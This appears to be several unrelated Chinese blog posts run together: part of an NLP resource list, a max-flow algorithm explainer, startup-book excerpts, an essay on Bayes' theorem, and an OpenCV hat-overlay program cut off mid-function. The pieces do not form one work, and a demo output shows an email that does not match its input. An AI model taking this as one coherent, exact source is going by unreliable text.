28. 公司名字大全： github repo
29. 古诗词库： github repo 更全的古诗词库
30. THU整理的词库： link
已整理到本repo的data文件夹中.
IT词库、财经词库、成语词库、地名词库、历史名人词库、诗词词库、医学词库、饮食词库、法律词库、汽车词库、动物词库

31. 中文聊天语料 link
该库搜集了包含:豆瓣多轮, PTT八卦语料, 青云语料, 电视剧对白语料, 贴吧论坛回帖语料,微博语料,小黄鸡语料

32. 中文 谣 言 数据: github
该数据文件中，每一行为一条json格式的谣言数据，字段释义如下：

rumorCode: 该条谣言的唯一编码，可以通过该编码直接访问该谣言举报页面。
title: 该条谣言被举报的标题内容
informerName: 举报者微博名称
informerUrl: 举报者微博链接
rumormongerName: 发布谣言者的微博名称
rumormongerUr: 发布谣言者的微博链接
rumorText: 谣言内容
visitTimes: 该谣言被访问次数
result: 该谣言审查结果
publishTime: 该谣言被举报时间

33. 情感波动分析：github
词库已整理到本repo的data文件夹中.
本repo项目是一个通过与人对话获得其情感值波动图谱, 内用词库在data文件夹中.

34. 百度中文问答数据集：链接 提取码: 2dva
35. 句子、QA相似度匹配:MatchZoo github
文本相似度匹配算法的集合，包含多个深度学习的方法，值得尝试。
36. bert资源：


Bert原作者的slides: link
提取码: iarj


文本分类实践: github


bert tutorial文本分类教程: github


bert pytorch实现:  github


bert用于中文命名实体识别 tensorflow版本: github


bert 基于 keras 的封装分类标注框架 Kashgari，几分钟即可搭建一个分类或者序列标注模型: github


bert、ELMO的图解： github


BERT: Pre-trained models and downstream applications: github


37. Texar - Toolkit for Text Generation and Beyond: github
基于Tensorflow的开源工具包，旨在支持广泛的机器学习，特别是文本生成任务，如机器翻译、对话、摘要、内容处置、语言建模等
38. 中文事件抽取： github
中文复合事件抽取，包括条件事件、因果事件、顺承事件、反转事件等事件抽取，并形成事理图谱。
39. cocoNLP: github
人名、地址、邮箱、手机号、手机归属地 等信息的抽取，rake短语抽取算法。

pip install cocoNLP

>>> from cocoNLP.extractor import extractor

>>> ex = extractor()

>>> text = '急寻特朗普，男孩，于2018年11月27号11时在陕西省安康市汉滨区走失。丢失发型短发，...如有线索，请迅速与警方联系：18100065143，132-6156-2938，baizhantang@sina.com.cn 和yangyangfuture at gmail dot com'

# 抽取邮箱
>>> emails = ex.extract_email(text)
>>> print(emails)

['baizhantang@sina.com.cn', 'yangyangfuture@gmail.com.cn']
# 抽取手机号
>>> cellphones = ex.extract_cellphone(text,nation='CHN')
>>> print(cellphones)

['18100065143', '13261562938']
# 抽取手机归属地、运营商
>>> cell_locs = [ex.extract_cellphone_location(cell,'CHN') for cell in cellphones]
>>> print(cell_locs)

cellphone_location [{'phone': '18100065143', 'province': '上海', 'city': '上海', 'zip_code': '200000', 'area_code': '021', 'phone_type': '电信'}]
# 抽取地址信息
>>> locations = ex.extract_locations(text)
>>> print(locations)
['陕西省安康市汉滨区', '安康市汉滨区', '汉滨区']
# 抽取时间点
>>> times = ex.extract_time(text)
>>> print(times)
time {"type": "timestamp", "timestamp": "2018-11-27 11:00:00"}
# 抽取人名
>>> name = ex.extract_name(text)
>>> print(name)
特朗普


40. 国内电话号码正则匹配（三大运营商+虚拟等）: github
41. 清华大学XLORE:中英文跨语言百科知识图谱: link
上述链接中包含了所有实体及关系的TTL文件，更多数据将在近期发布。
概念，实例，属性和上下位关系数目




百度
中文维基
英文维基
总数




概念数量
32,009
150,241
326,518
508,768


实例数量
1,629,591
640,622
1,235,178
3,505,391


属性数量
157,370
45,190
26,723
229.283


InstanceOf
7,584,931
1,449,925
3,032,515
12,067,371


SubClassOf
2,784
191,577
555,538
749,899


跨语言连接（概念/实例）




百度
中文维基
英文维基




百度
-
10,216/336,890
4,846/303,108


中文维基
10,216/336,890
-
28,921/454,579


英文维基
4,846/303,108
28,921/454,579
-


42. 清华大学人工智能技术系列报告： link
每年会出AI领域相关的报告，内容包含

自然语言处理 link
知识图谱 link
数据挖掘 link
自动驾驶 link
机器翻译 link
区块链 link
机器人 link
计算机图形学 link
3D打印 link
人脸识别 link
人工智能芯片 link
等等

43.自然语言生成方面:
Ehud Reiter教授的博客  北大万小军教授强力推荐，该博客对NLG技术、评价与应用进行了深入的探讨与反思。
文本生成相关资源大列表
自然语言生成：让机器掌握自动创作的本领 - 开放域对话生成及在微软小冰中的实践
文本生成控制
44.:
jieba和hanlp就不必介绍了吧。
45.NLP太难了系列: github

来到杨过曾经生活过的地方，小龙女动情地说：“我也想过过过儿过过的生活。” ​​​
来到儿子等校车的地方，邓超对孙俪说：“我也想等等等等等过的那辆车。”
赵敏说：我也想控忌忌己不想无忌。
你也想犯范范范玮琪犯过的错吗
对叙打击是一次性行为？

46.自动对联数据及机器人:
70万对联数据 link
代码 link



上联
下联




殷勤怕负三春意
潇洒难书一字愁


如此清秋何吝酒
这般明月不须钱


47.用户名黑名单列表： github
包含了用户名禁用列表，比如: link
administrator
administration
autoconfig
autodiscover
broadcasthost
domain
editor
guest
host
hostmaster
info
keybase.txt
localdomain
localhost
master
mail
mail0
mail1

48.罪名法务名词及分类模型: github
包含856项 罪 * 名 知识图谱, 基于280万罪名训练库的罪名预测,基于20W法务问答对的13类问题分类与法律资讯问答功能

49.微信公众号语料: github
3G语料，包含部分网络抓取的微信公众号的文章，已经去除HTML，只包含了纯文本。每行一篇，是JSON格式，name是微信公众号名字，account是微信公众号ID，title是题目，content是正文
50.cs224n深度学习自然语言处理课程：link

课程中模型的pytorch实现 link
面向深度学习研究人员的自然语言处理实例教程 link

51.中文手写汉字识别：github
52.中文自然语言处理 语料/数据集：github
竞品：THUOCL（THU Open Chinese Lexicon）中文词库
53.变量命名神器：github link
54.分词语料库+代码：百度网盘链接

提取码: pea6
keras实现的基于Bi-LSTM + CRF的中文分词+词性标注
基于Universal Transformer + CRF 的中文分词和词性标注
快速神经网络分词包 java version

55. NLP新书推荐《Natural Language Processing》by Jacob Eisenstein： link
56. 任务型对话英文数据集： github
【最全任务型对话数据集】主要介绍了一份任务型对话数据集大全，这份数据集大全涵盖了到目前在任务型对话领域的所有常用数据集的主要信息。此外，为了帮助研究者更好的把握领域进展的脉络，我们以Leaderboard的形式给出了几个数据集上的State-of-the-art实验结果。
57. ASR 语音数据集 + 基于深度学习的中文语音识别系统： github


Data Sets 数据集


清华大学THCHS30中文语音数据集
data_thchs30.tgz
OpenSLR国内镜像
OpenSLR国外镜像
test-noise.tgz
OpenSLR国内镜像
OpenSLR国外镜像
resource.tgz
OpenSLR国内镜像
OpenSLR国外镜像


Free ST Chinese Mandarin Corpus
ST-CMDS-20170001_1-OS.tar.gz
OpenSLR国内镜像
OpenSLR国外镜像


AIShell-1 开源版数据集
data_aishell.tgz
OpenSLR国内镜像
OpenSLR国外镜像


注：数据集解压方法
$ tar xzf data_aishell.tgz
$ cd data_aishell/wav
$ for tar in *.tar.gz;  do tar xvf $tar; done



Primewords Chinese Corpus Set 1
primewords_md_2018_set1.tar.gz
OpenSLR国内镜像
OpenSLR国外镜像




58. 笑声检测器： github
59. Microsoft多语言数字/单位/如日期时间识别包： [github](https://github.com/Microsoft/Recognizers-Text
60. chinese-xinhua 中华新华字典数据库及api，包括常用歇后语、成语、词语和汉字 github
61. 文档图谱自动生成 github

TextGrapher - Text Content Grapher based on keyinfo extraction by NLP method。输入一篇文档，将文档进行关键信息提取，进行结构化，并最终组织成图谱组织形式，形成对文章语义信息的图谱化展示

62. SpaCy 中文模型 github

包含Parser, NER, 语法树等功能。有一些英文package使用spacy的英文模型的，如果要适配中文，可能需要使用spacy中文模型。

63. Common Voice语音识别数据集新版 link

包括来自42,000名贡献者超过1,400小时的语音样本，涵github

64. 神经网络关系抽取 pytorch github

暂不支持中文

65. 基于bert的命名实体识别 pytorch github

暂不支持中文

66. 关键词(Keyphrase)抽取包 pke github
pke: an open source python-based keyphrase extraction toolkit

暂不支持中文，我于近期对其进行修改，使其适配中文。
请关注我的github动态，谢谢！

67. 基于医疗领域知识图谱的问答系统 github

该repo参考了github








 
出处：http://blog.csdn.net/euler1983/article/details/5959622
算法优化algorithmgraphtree任务
这篇文章说的是Yuri Boykov and Vladimir Kolmogorov在2004年提出的一种基于增广路径的求解最大流最小割的算法，号称大部分情况下会很快。而且在算完之后，会自动完成最小割集的构造。
作者写了一个C的实现：http://vision.csd.uwo.ca/code/maxflow-v3.01.zip
文章参考：《GRAPH BASED ALGORITHMS FOR SCENE RECONSTRUCTION FROM TWO OR MORE VIEWS》这是作者的博士论文，在最后的一章节里详细提到了这种算法的思路。
这个算法的思路并不难懂，但是看起来有点难度。文中充满了q is children of p之类的表述，看着看着就混淆了。而且代码里的变量命名也很随意，花了3,4天的时间，终于搞定。
算法的直观理解
第一个改进：

首先算法采用了两条增广路径，分别从source和sink出发，边搜索边标号，这样当所有的点都被搜索并标号后，最小割集也就形成了。
所有在最前沿的点称为active node，这些点的任务是去发展新的node。而被active node包围起来的那些点，则称之为passive node。
而没有被发掘出来的点则称之为free node。
第二个改进：
基于增广路径的算法都是遵循：找出一个可行流----》更新残留网络----》然后再找下一个可行流。
此算法需要不断地去找可行流，而每次找都得从源点重新开始进行一个广度遍历或者深度遍历直到找到汇点。这篇文章的算法正是基于此来进行改进。
找到一个可行流后，要进行augmention，然后必然会出现饱和的边，比如这样的一条路中：p1----->p2---->p3----->p4，p2->p3这条边饱和了。如果我们不管他，还是继续遍历去寻找汇点，那么当你再次找到一条路后，那么这条路中就有可能包含一些已经饱和路径，那就没法进行增广了。所以，我们必须要去调整那些饱和的边，使得在已经构建的路径中不存在饱和的边。在本例中，p3称之为orphan（孤点），那么接下来就得做一个adopt orphan的操作，呵呵，名字起得很有意思（养育孤儿），意思就是说给每个p3这样的孤儿点找一个新的parent，养育完就没有orphan存在了。方法如下：
检查p3的neighbors，看看有没有一个neighbor, let's say node q，s.t.
(1). q->p3满足容量大于0
(2). q是已经被搜过的点，也就是说q已经在我们的span tree了，in another word，当我们沿着汇点逆流而上搜索到q时，可以顺利地找到q的father，从而最终可以顺藤摸瓜摸到source上。
(3). 通过q最终能到达source或者sink这样的终点。这是因为有可能顺着q走着走着，最终走到一个free node去了。或者走到一个orphan去了，而这个orphan最终也无人抚养而变成free node。
那么如果找不到这样的q，那么p3就不得不变成free node。然后再做以下两个调整：
(4). 对于p3的邻居pk，如果pk到p3的边(pk-->p3)的容量大于0, 则将pk设为active。
(5). 对于p3的邻居ph，如果p3=parent(ph)，那么把ph也设置为orphan，加入到orphan集合里。
这是因为当有一条路从sink走到ph的时候，会发现无路可走了，因为parent(ph)是一个free node!
所以我们必须对ph也做相同的处理，要么找一个新的parent，要么您老人家变成free node，先一边凉快会！
orphan集合中在增广时建立，每次更新一个边后，如果发现改变后的边的残留流量=0，则把边指向的那个点加入orphan set。
在adoption阶段，反复从orphan set中取点，每取出一个孤儿，首先看看能不能找到一个新的parent，如果找不到则令其变成free node，并把他的child变成orphan，加入到orphan集合中。循环往复，直到orphan set = 空集。
细节：
对上述的(3)可以进行优化。
优化一：不必每次要追溯到source/sink才罢休。
因为对于orphan的每一个邻居进行判断其是否originate from TERMINATE node时，都要逆流追溯至source / sink点。那么其中的一些点可能要被追溯多次，那么这是一个重复的操作。如果一个点，已经被证明了，他是可以到达source / sink的，那么下次当有点经过他的时候，他就可以直接告诉该点，OK，哥们歇歇吧，你是valid的，通过我可以追溯到source/sink。这就是在algorithm tunning里提到的mark的意思。
优化二：选择离source/sink最近的那个neighbor，作为orphan的新parent.
要实现这个优化，必须给每个节点附加一个属性：该节点到source/sink的最短距离。
并且在growth阶段，当一个active node q1 遇到另一个active node q2时，要比较一下是否把parent(q2)=q1后，q2到source/sink的距离更短，如果是，那么就调整下q2，使得它变成q1的child。正所谓：
人往高处走，水往低处流，节点都往终点凑！









我记得hongyang大神说，当你觉的不满意的时候，那么你的机会来就了。
《创业：我们创什么》这本书，很好的诠释了这个观点，全书围绕时下最火的创业点，各个行业的风口，进行了一一剖析。
创业你还在等什么！ 
 
 
《财经天下》周刊主编

他急切地想要得到相关证照，不是为了阻止后来者——商业社会无法靠证照阻止竞争，而是想要让行业各方面参与者的责任边界变得清晰，更有利于行业发展。他说，当前更实际的做法是，尽快做大规模，加强商业契约的合理性，倒逼政策法规的制定。
                                 ----也以此缅怀，春雨医生的张锐先生


第1章 争夺“机场+”入口


肖昭恩表示，逸臣现有商业模式可简要概括为“拿地+运营”。“拿地”即从机场商业管理公司处取得航站楼特定区域的特许经营权，“运营”即根据公司商业规划，结合经营区域所在位置，确定经营业态，装修后开展经营。
他还留意到坐飞机的人中，坐在前排头等舱的人更爱看书，坐在后面经济舱的人打游戏居多。


第2章 “超市搬运工”的生意能做多大？

之后，邵又找来曾在IBM中国区就职的马来西亚籍华人杜国强。邵元元曾在接受科技网站36氪采访时透露，三名创始人当年最终凑出了3000万元初始资金，于2012年3月在北京创立了家捷送电子商务有限公司（下称家捷送）。


第3章 李志活在互联网上

2011年年初，李志拖着几大箱自己的唱片到荒郊野外，付之一炬，下决心下张专辑不做实体。
迟斌回忆，那是2011年情人节之后，李志把烧唱片经过录了下来，并选择了一首齐秦的歌——《把梦烧光》作为背景音乐，其中有这样一句歌词：“输得荒凉，死得牵强。”
“不赚钱的商业是不道德的”
聚在一起还会导致一个很致命的问题，像《乌合之众》里所写：个体的习惯和行为会被群体影响，没有了自己的特色。


第4章 一起作业网：要么火，要么死

“我会一直投，直到它挣到钱或者挣不到钱。”


第5章 摩登天空：不仅是中国公司，它还会成为一家全球公司

他认为，工作以及从事的行业只是人本身的延伸。
具备创造力的想象力，会衍生出商业想象力。


第6章 做题机器

一个产品如果免费都没有人用，就不用想别的了。”互联网行业先圈地后种庄稼的模式依然被奉为准则。
技术路线上，学习宝是OCR技术，而我们追求的是STR技术，自然环境下的文字识别。


第9章 “一元洗车”杀入汽车后市场

O2O创业必须要满足三个条件：刚需、有痛点、高频次。


第11章 “开桌”试图打通O2O 最后一公里

“打车软件烧钱大战的大赢家不是滴滴和快的，而是财付通和支付宝。这个案例充分证明，O2O模式竞争离不开移动支付清算，这是构建移动商务业务闭环的必要条件，另一个必要条件是支付的场景。”


第16章 饿了么想做餐饮业“天猫”

一切都源自2008年4月深夜寝室里的那句“你们饿了么”。当时在上海交大读研一的张旭豪和室友在房间里翻找外卖单。“不饿的时候外卖单随处扔，等到真的饿的时候却找不到了。”


第17章 疯狂的煎饼

餐饮业的人他随时可以找，但要找到能给餐饮业带来新鲜感的人却并不容易。
他很懂年轻人的语境：情侣来店亲吻就获赠煎饼果子一套，光棍节有油条相赠，奥巴马连任也搞促销，效仿苹果大会召开世界煎饼果子大会，店里摆放着时髦玩偶和小木马——总之，营造各种气氛来让粉丝主动在社交网络上曝光黄太吉。


第18章 十万笑话，冷极必火

后现代文本中的标志性特征——反逻辑、不合作、跳脱等，在《十冷》中被奉为高级别招数。


第19章 “坏孩子”的新时代

从2003年国家体育总局宣布电子竞技成为我国第99个正式体育项目至今，电竞获得合法身份已经有12年
柚子在服务器内闯下了响当当的名号，但为了玩游戏，他在高一办理了休学。“父母肯定是不支持的，不过我爸对我很好，也没有很反对。”柚子说自己是“电竞选手中比较少的得到家人理解的运动员。”一次在网吧玩游戏的时候他父亲过去拍了拍他肩膀，就在朋友们都认为他要被父亲揪回家的时候，他父亲却问他吃饭了吗？还掏出200元钱让他自己去买饭。


第20章 活在视频网站

《老外屌丝超强十二人模仿》红了以后，Mike隋花掉5000块钱买了微博大号的营销。但当视频真正火起来后，Mike隋才意识到，具备病毒式传播基因的视频其实是不需要营销的，它自然会火。


第21章 离开腾讯的日子

百度的离职员工组织叫“百老汇”，阿里巴巴的叫“前橙会”，网易的叫“离易”、“新浪的叫“毕浪”，金山的叫“旧金山”等等。
2014年以来，无论是腾讯人力资源的员工回流计划，还是腾讯开放平台对腾讯系创业者的欢迎，还是投资部连续在老员工创业项目中的投资，都在表达一个强烈的信号：腾讯在乎老员工。

第32章 把私人医生请到你的手机里

他急切地想要得到相关证照，不是为了阻止后来者——商业社会无法靠证照阻止竞争，而是想要让行业各方面参与者的责任边界变得清晰，更有利于行业发展。他说，当前更实际的做法是，尽快做大规模，加强商业契约的合理性，倒逼政策法规的制定。
 









作者：黄永刚
初次接触《概率论与数理统计》这门课的时候，脑袋中只有三个词：黑球、白球、袋子，所有的课程内容就是先取,后取，接触一月之后成功的被放趴下了，因此对于这门课程是没有什么好感的，考试也在“互助互爱”中顺利通过了。
大三为了准备考研又不得不再次拿起了那本厚厚的同济绿皮书，但也只是学会了先取和后取的区别和一些运算的技巧。脑海里一直存在一个疑问学这些球，用处何在？等到上研期间接触到一些应用才逐渐有所领悟，渐渐的惊讶于它的神奇与美妙。
这篇文章选择对于概率论中的贝叶斯理论进行阐述，由于网络上已经存在一些里程碑式的经典之作，因此尝试站在巨人的肩膀上讲一些另类的东西。
本文主要分为三个部分：

第一部分在引入贝叶斯公式的基础上介绍它的部分应用； 
  第二部分主要介绍贝斯理论的核心观念； 
  第三部分论述贝叶斯理论对于个人生活的启示。

SECTION 1 贝叶斯理论及应用
维基百科的陈述如下：
贝叶斯定理是关于随机事件A和B的条件概率的一则定理。 

其中P(A|B)是在B发生的情况下A发生的可能性。
在贝叶斯定理中，每个名词都有约定俗成的名称： 
P(A|B)是已知B发生后A的条件概率，也由于得自B的取值而被称作A的后验概率。 
P(B|A)是已知A生发后B的条件概率，也由于得自A的取值而被称作B的后验概率。 
P(A)是A的先验概率或（或边缘概率）。之所以称为”先验”是因为它不考虑任何B方面的因素。 
P(B)是B的先验概率或边缘概率。
按这些术语，贝叶斯定理可表述为：
后验概率 = (相似度*先验概率)/标准化常量 
也就是说，后验概率与先验概率和相似度的乘积成正比。
例子：
重复的抛掷一枚具有两个面的物体，抛出去5次，5次正面，0次反面，从正常的概率角度即相似度去推断，下一次抛掷得到正面的概率是1，得到反面的概率是0；那如果我告诉你这个物体就是硬币的时候，大家很容易知道这个推断不成立的，大脑的意识告诉我们抛掷一次硬币得到正反面的概率应该近似相等地；我们会考虑到，抛掷硬币之间是相互独立的，每一次抛掷的结果是不受前面结果的影响的，它下一次抛掷的结果得到正反面的概率应该还是近似相等的。
这里的思考过程就是我们上面说到的先验P(A)，先于我们抛掷硬币事件之前形成的知识或意识；而前面得到五次都是正面，是不是这个硬币不均匀啊？是不是应该放大一下正面的概率为好！这里思考就是相似度起作用的过程P(B|A)，因此整个决策过程就是相似度和先验概率共同作用的过程。 
这里的事件B就是五次正面，0次反面的条件下，求事件A即下次抛掷结果的概率即求P(A|B)大小。
再来看下面这个句子：
The girl saw the boy with a telescope.
你对这句话的含义有什么猜测？平常人肯定会说：那个女孩拿望远镜看见了那个男孩（即你对这个句子背后的实际语法结构的猜测是：The girl saw-with-a-telescope the boy ）。然而，仔细一想，你会发现这个句子完全可以解释成：那个女孩看见了那个拿着望远镜的男孩（即：The girl saw the-boy-with-a-telescope ）。
那为什么平常生活中我们每个人都能够迅速地对这种二义性进行消解呢？这是因为saw和telescope一起出现的可能性要比一个拿着telescope的男孩出现的可能性要高，如果把男孩换成猎人，我们的理解又会变成另外一种了，此时猎人的组合又比小女孩用telescope看出现的可能性更高。telescope和saw更搭还是和男孩更搭配，是小女孩和telescope搭配还是猎人和telescope更搭一些，我们大脑中对于这个判断所使用的意识，在贝叶斯理论中就称为先验P(A)；在忽略这种先验的情况下，boy with a telescope和The girl saw with a telescope在相似性度量上是相同的即P(B|A)。后验概率与先验概率和相似度的乘积成正比，因此在相似度相同和先验概率不同的情况下就很容易区分出这个语句的具体含义了。
由于贝叶斯理论简单并描述了事物判断的本质，因此在众多方面都有应用。例如自动拼写纠正、机器翻译、垃圾邮件过滤、中文分词等等都应用到了贝叶斯理论，还有机器学习等学科中各种复杂理论都多多少少能够看到贝叶斯的身影，如：贝叶斯网络、马尔科夫模型、条件随机场、模型选择理论等等，最权威的证据就是Christopher Bishop 从贝叶斯角度的诠释—机器学习的“圣经”PRML。在实践中直接产生巨大影响的，如后面链接中松鼠会文章讲述的美国海军在汪洋大海里搜索丢失的氢弹、失踪的核潜艇、数盟文章中联邦党人文集作者公案均使用贝叶斯理论。
【郑重提醒，先验概率里面的“先验”并不是指先于一切经验，而是仅指先于“当前”给出的观测数据而已，并非“先天”。】
下面这幅图是随意找的贝叶斯理论在其他领域的研究（去除掉了贝叶斯的主要的两个应用领域金融和计算机领域）。

贝叶斯理论几乎已经渗透到我们生活的各个方面中。我们每时每刻也在应用这些理论，像松鼠会文章中介绍的把妹经历等，前几年很火的”微笑表哥“事件可谓是一块表引起的战火等。我给我的母亲说过这样一段话：我的一生就像作画一样，你们在我还是一张白纸的时候就勾勒出一个人的轮廓了；具体的眼睛大小、眉毛风格、发型样式才是我们努力描绘的，但是不论我们多么努力，它最终只会成为一幅人物画。对于成为人物画还是山水画，我们是无法控制的。
我所说的无法控制的东西也就是我们上面所说的先验P(A)，我们努力改变的就是P(B|A)，人生的成功和事件的成功不仅仅受我们自己控制即P(B|A)，还受到P(A)控制，所以有的时候事情的失败或不如意原因并不能全归咎于我们努力的不够。很多时候，不是它不存在而是你没有意识到它的存在而已，就像这里的P(A)。
SECTION 2
当你不能准确知悉一个事物的本质时，你可以依靠与特定本质相关事件出现的频率去判断其本质属性的概率。用数学语言表达就是：支持某项属性的事件发生得愈多，则该属性成立的可能性就愈大。
拉普拉斯关心的问题是：当存在着大量数据，但数据又可能有各种各样的错误和遗漏的时候，我们如何才能从中找到真实的规律。
经典统计学，或者叫频率主义统计学：从理论上讲，它可以揭示一切现象产生的原因，既不需要构建模型，也不需要默认条件，只要进行足够多次的测量，隐藏在数据背后的原因就会自动揭开面纱。
在经典统计学看来，科学是关于客观事实的研究，我们只要反复观察一个可重复的现象，直到积累了足够多的数据，就能从中推断出有意义的规律。而贝叶斯方法却要求科学家像算命先生一样，从主观猜测出发【先验】，这显然不符合科学精神。就连拉普拉斯后来也放弃了贝叶斯方法这一思路，转向经典统计学。因为他发现，如果数据量足够大，人们完全可以通过直接研究这些样本来推断总体的规律。
但后来事实证明在认识事物不全面的情况下，贝叶斯方法是一种很好的利用经验帮助作出更合理判断的方法。
经典统计学比较适合于解决小型的问题，同时该方法要求我们获得足够多的样本数据，而且要求这些样本能够代表数据的整体特征。在处理涉及几个参数的问题时，它可以得心应手。但如果相对于问题的复杂程度，我们只掌握少量的信息时，经典统计学就显得力不从心了，原因就是数据的稀疏性问题。
根据采样定理进行估算，采用经典统计学方法至少需要获得1%-10%的样本才能确定其整体特征，因此对于少量信息经典统计学是不适用地。 
贝叶斯公式的价值在于，当观测数据不充分时，它可以将专家意见和原始数据进行综合，以弥补测量中的不足。我们的认知缺陷越大，贝叶斯公式的价值就越大。
人工智能近年来取得了长足的进步，但目前的人工智能通常需要从大量的数据中进行学习，而人类具有“仅从少量案例就形成概念”的能力，两者之间存在巨大差距。比如，尽管你这辈子只见过一个菠萝，但你一眼就能看出菠萝的特征，很快就能从一堆水果中认出菠萝来，甚至还能在纸上画出菠萝的简笔画，而目前的人工智能算法得看成千上万张菠萝的图片才能做到。
当科学不断强调其对世界认识的客观性时，贝叶斯公式却融入了主观性因素：它并不向我们表述世界，而是表述我们所掌握的知识和经验。这些带有观察者个人因素的知识是脱离研究现象本身的；而它在向我们描述外部现实世界的同时，也描述了观察者对现实的认知。更重要的，它迫使我们认识到，科学理论和科学模型反映的是现实的心理意象，而不是现实本身。而现实为我们提供数据，以保证对现实的意象不会离现实本身太远。在寻找各种现象原因的同时，它也在规范着我们的思想。
我们经常需要在信息不充分或者不准确的情况下进行判断和决策，一条街上哪个饭馆最靠谱?在自习室惊鸿一瞥的女神有没有男朋友?老公的公文包里发现一只口红，他有没有出轨?新开发的App应该等做得尽善尽美再发布，还是应该尽早发布，用互联网的力量帮助它完善?我应该选择哪个工作offer或者还是考公务员才能使自己的收益最大化?
贝叶斯公式为我们提供了一些决策原则：
平时注意观察和思考，建立自己的思维框架，这样在面临选择时就容易形成一个接近实际情况的先验概率，这样经过少量的试错和纠错的迭代循环就可能得到理想的结果;在经过很多次选择和实践的历练后就能够形成自己的直觉，在面对陌生情况时，根据自己的经验和少量信息就能够快速地做出比较准确的判断。
SECTION 3
农夫想象中的皇宫生活是“皇帝用的一定是金扁担”，农妇想象中的生活是“西宫娘娘摊鸡蛋，东宫娘娘烙大饼”，早期的科幻小说，如凡尔纳那个系列的，对于未来生活的高科技描写大多基于机械革新，各种按键各种机器，因为那是机械时代的作品。之后的科幻小说中的机械，大多是触屏全息屏很少有整排整排的按键出现了。为什么？因为我们的知识结构升级了，我们知道我们不需要那样键盘装的按钮出现在高科技的未来中了。或许将来我们对未来的想象还会新的提升。而这些想象，都是基于我们对现在世界的了解。
插播几张朝鲜人民对中国的想象，这想象力，这违和感……。
 

因此，一个人在生活中基于对世界的认识，建立起自己的先验系统，再此基础上结合当前情况作出想象、选择和判断。
对于普通人要提高自己的效率和生活质量，在先验的建立上可以从以下两点着手：一是保持好奇心，尽可能多的参与人生体验，没试过的都试试。年纪轻轻就开始追求“平淡是真”的，多半是因为见识太短；二是多阅读，因为阅读是获取知识面的最廉价的办法，没有之一。
总结
贝叶斯理论的应用从开始就处在我们生活的各个方面，简单的理论在生活中表现却如此的丰富多彩，人们称数学是上帝的语言，从此就可见一斑了。
谈起数学理论很多人第一时间都会皱眉头，在十几近二十年的求学生涯中，我们从根源上已经产生了一种排异反应。但当我们一次一次的从生活具体的现象和事物中去深入思考的时候，那些最核心、最有趣的却是这些数学理论；当一次次的发现生活中到处渗透着数学理论甚至生活就是数学规律的各种表现形式的结合体时，我们不禁苦笑……。重新接纳数学，将其融入我们的生活中和思想中是需要时间的，还有很长的路要走。最后愿与诸君共勉。
reference

王晓峰，大数据背后的神秘公式(上)：贝叶斯公式，http://dataunion.org/25353.html，2016-04-15. 
  Albert_JIAO，死理性派是怎样判断漂亮女孩是不是单身的， 
http://songshuhui.net/archives/62770，2011-12-20. 
  王小圈，如何变成有趣的人， 
http://mp.weixin.qq.com/s?__biz=MzA4ODM1MTMzMQ==&mid=504308124&idx=6&sn=7e4800ba0c9749f19d09f5aacadff4c1&scene=18#wechat_redirect，2016-06-08. 
  刘未鹏，数学之美番外篇：平凡而又神奇的贝叶斯方法， 
http://mindhacks.cn/2008/09/21/the-magical-bayesian-method/，2008-09-21. 
  LeftNotEasy,贝叶斯、概率分布与机器习, 
http://www.cnblogs.com/LeftNotEasy/archive/2010/09/27/1837163.html,2010-09-27.


本文原创首发于公众号：老王和他的IT界朋友们
微信扫描关注微信号：（原创投稿有惊喜！！！）








 






我们来看下效果原图： 效果：       原理其实很简单：采用一张圣诞帽的png图像作为素材，         利用png图像背景是透明的，贴在背景图片上就是戴帽子的效果了。人脸检测的目的主要是为了确定贴帽子的位置，类似ps中自由变换的功能，检测到人脸中间的位置，resize圣诞帽子和人脸大小匹配，确定位置，贴上去，ok！   代码：非常简洁，根据参考博客给出的代码，由OpenCV自带的人脸检测代码经过简单修改即可。// getheader.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include "opencv2/objdetect/objdetect.hpp"
#include "opencv2/highgui/highgui.hpp"
#include "opencv2/imgproc/imgproc.hpp"

#include <iostream>
#include <stdio.h>

using namespace std;
using namespace cv;


#pragma comment(lib,"opencv_core2410d.lib")                
#pragma comment(lib,"opencv_highgui2410d.lib")                
#pragma comment(lib,"opencv_objdetect2410d.lib")   
#pragma comment(lib,"opencv_imgproc2410d.lib")  

/** Function Headers */
void detectAndDisplay( Mat frame );

/** Global variables */
//-- Note, either copy these two files from opencv/data/haarscascades to your current folder, or change these locations
String face_cascade_name = "D:\\Program Files\\opencv\\sources\\data\\haarcascades\\haarcascade_frontalface_alt.xml";
String eyes_cascade_name = "D:\\Program Files\\opencv\\sources\\data\\haarcascades\\haarcascade_eye_tree_eyeglasses.xml";
CascadeClassifier face_cascade;
CascadeClassifier eyes_cascade;
string window_name = "Capture - Face detection";
RNG rng(12345);

const int FRAME_WIDTH = 1280;
const int FRAME_HEIGHT = 240;
/**
* @function main
*/
int main( void )
{
	CvCapture* capture;
	//VideoCapture capture;
	Mat frame;

	//-- 1. Load the cascades
	if( !face_cascade.load( face_cascade_name ) ){ printf("--(!)Error loading\n"); return -1; };
	if( !eyes_cascade.load( eyes_cascade_name ) ){ printf("--(!)Error loading\n"); return -1; };

			frame = imread("19.jpg");//背景图片

			//-- 3. Apply the classifier to the frame
			if( !frame.empty() )
			{ detectAndDisplay( frame ); }
			
			waitKey(0);
	
	return 0;
}

void mapToMat(const cv::Mat &srcAlpha, cv::Mat &dest, int x, int y)
{
	int nc = 3;
	int alpha = 0;

	for (int j = 0; j < srcAlpha.rows; j++)
	{
		for (int i = 0; i < srcAlpha.cols*3; i += 3)
		{
			alpha = srcAlpha.ptr<uchar>(j)[i / 3*4 + 3];
			//alpha = 255-alpha;
			if(alpha != 0) //4通道图像的alpha判断
			{
				for (int k = 0; k < 3; k++)
				{
					// if (src1.ptr<uchar>(j)[i / nc*nc + k] != 0)
					if( (j+y < dest.rows) && (j+y>=0) &&
						((i+x*3) / 3*3 + k < dest.cols*3) && ((i+x*3) / 3*3 + k >= 0) &&
						(i/nc*4 + k < srcAlpha.cols*4) && (i/nc*4 + k >=0) )
					{
						dest.ptr<uchar>(j+y)[(i+x*nc) / nc*nc + k] = srcAlpha.ptr<uchar>(j)[(i) / nc*4 + k];
					}
				}
			}
		}
	}
}

/**
* @function detectAndDisplay
*/
void detectAndDisplay( Mat frame )
{
	std::vector<Rect> faces;
	Mat frame_gray;
	Mat hatAlpha;

	hatAlpha = imread("2.png",-1);//圣诞帽的图片

	cvtColor( frame, frame_gray, COLOR_BGR2GRAY );
	equalizeHist( frame_gray, frame_gray );
	//-- Detect faces
